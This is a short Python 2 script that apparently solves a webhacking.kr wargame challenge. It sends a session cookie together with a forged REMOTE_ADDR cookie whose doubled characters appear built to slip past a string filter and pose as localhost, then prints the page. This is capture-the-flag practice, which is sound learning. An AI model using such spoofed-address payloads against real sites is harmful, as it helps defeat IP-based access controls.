#-*- coding: utf-8 -*-
import urllib2
import CookieManager

challengeUrl = "http://webhacking.kr/challenge/bonus/bonus-4/"
sessionId = "e28ad7cb81a98a13982054373940bf92"

CookieManager.addCookie("PHPSESSID", sessionId)
CookieManager.addCookie("REMOTE_ADDR", "112277..00..00..1")
    
httpRequest = urllib2.Request(challengeUrl)
httpRequest.add_header("Cookie", CookieManager.getCookie())

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
